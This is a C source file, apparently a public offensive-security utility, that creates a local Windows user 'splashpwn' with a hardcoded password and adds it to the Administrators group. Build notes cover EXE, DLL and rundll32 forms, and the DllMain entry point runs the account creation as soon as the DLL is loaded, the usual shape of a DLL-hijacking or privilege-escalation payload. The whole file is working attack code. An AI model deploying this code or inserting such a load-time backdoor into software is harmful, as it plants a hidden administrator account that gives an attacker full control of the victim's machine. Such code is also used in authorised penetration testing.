/*
 * ADDUSER.C: creating a Windows user programmatically.
 * credit: https://github.com/newsoft/adduser
 */

#define UNICODE
#define _UNICODE

#include <windows.h>
#include <string.h>
#include <Lmaccess.h>
#include <lmerr.h>
#include <Tchar.h>

/*
## Compiling
### Using MinGW (tested on macOS, but Linux should work)

- Create a 32-bit EXE file:
`i686-w64-mingw32-gcc -oadduser32.exe adduser.c -lnetapi32`
- Create a 32-bit DLL file:
`i686-w64-mingw32-gcc -shared -oadduser32.dll adduser.c -lnetapi32`
- Create a 64-bit EXE file:
`x86_64-w64-mingw32-gcc -oadduser64.exe adduser.c -lnetapi32`
- Create a 64-bit DLL file:
`x86_64-w64-mingw32-gcc -shared -oadduser64.dll adduser.c -lnetapi32`

### Using Visual Studio (tested with VS2013)

- Create an EXE file:
`cl.exe adduser.c /link /DEFAULTLIB:ADVAPI32 /DEFAULTLIB:NETAPI32`
- Create a DLL file:
`cl.exe adduser.c /LD /link /DEFAULTLIB:ADVAPI32 /DEFAULTLIB:NETAPI32`
*/


DWORD CreateAdminUserInternal(void)
{
NET_API_STATUS rc;
BOOL b;
DWORD dw;

USER_INFO_1 ud;
LOCALGROUP_MEMBERS_INFO_0 gd;
SID_NAME_USE snu;

DWORD cbSid = 256;	// 256 bytes should be enough for everybody :)
BYTE Sid[256];

DWORD cbDomain = 256 / sizeof(TCHAR);
TCHAR Domain[256];

	//
	// Create user
	// http://msdn.microsoft.com/en-us/library/aa370649%28v=VS.85%29.aspx
	//

	memset(&ud, 0, sizeof(ud));

	ud.usri1_name		= _T("splashpwn");						// username
	ud.usri1_password	= _T("Spl@shD0wn123!");				// password
	ud.usri1_priv		= USER_PRIV_USER;					// cannot set USER_PRIV_ADMIN on creation
	ud.usri1_flags		= UF_SCRIPT | UF_NORMAL_ACCOUNT;	// must be set
	ud.usri1_script_path = NULL;

	rc = NetUserAdd(
		NULL,			// local server
		1,				// information level
		(LPBYTE)&ud,
		NULL			// error value
	);

	if (rc != NERR_Success) {
		_tprintf(_T("NetUserAdd FAIL %d 0x%08x\r\n"), rc, rc);
		return rc;
	}

	//
	// Get user SID
	// http://msdn.microsoft.com/en-us/library/aa379159(v=vs.85).aspx
	//

	b = LookupAccountName(
		NULL,			// local server
		_T("splashpwn"),	// account name
		Sid,			// SID
		&cbSid,			// SID size
		Domain,			// Domain
		&cbDomain,		// Domain size
		&snu			// SID_NAME_USE (enum)
	);

	if (!b) {
		dw = GetLastError();
		_tprintf(_T("LookupAccountName FAIL %d 0x%08x\r\n"), dw, dw);
		return dw;
	}

	//
	// Add user to "Administrators" local group
	// http://msdn.microsoft.com/en-us/library/aa370436%28v=VS.85%29.aspx
	//

	memset(&gd, 0, sizeof(gd));

	gd.lgrmi0_sid = (PSID)Sid;

	rc = NetLocalGroupAddMembers(
		NULL,					// local server
		_T("Administrators"),
		0,						// information level
		(LPBYTE)&gd,
		1						// only one entry
	);

	if (rc != NERR_Success) {
		_tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\r\n"), rc, rc);
		return rc;
	}

	return 0;
}

//
// DLL entry point.
//

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		CreateAdminUserInternal();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

//
// RUNDLL32 entry point.
// https://support.microsoft.com/en-us/help/164787/info-windows-rundll-and-rundll32-interface
//

#ifdef __cplusplus
extern "C" {
#endif

__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	CreateAdminUserInternal();
}

#ifdef __cplusplus
}
#endif

//
// Command-line entry point.
//

int main()
{
	return CreateAdminUserInternal();
}
